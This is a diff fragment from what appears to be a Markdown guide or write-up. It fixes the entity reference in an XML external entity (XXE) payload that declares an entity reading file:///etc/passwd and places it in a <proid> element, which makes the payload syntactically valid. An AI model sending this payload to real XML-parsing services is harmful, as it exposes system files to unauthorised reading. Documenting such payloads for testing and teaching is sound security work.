@@ -26,7 +26,7 @@ description: https://app.beeceptor.com/
 <?xml version="1.0"?>
 <!DOCTYPE hacktor [<!ENTITY read  SYSTEM "file:///etc/passwd">]>
 <check>
-    <proid>&read</proid>
+    <proid>&read;</proid>
 </check>
 ```
 
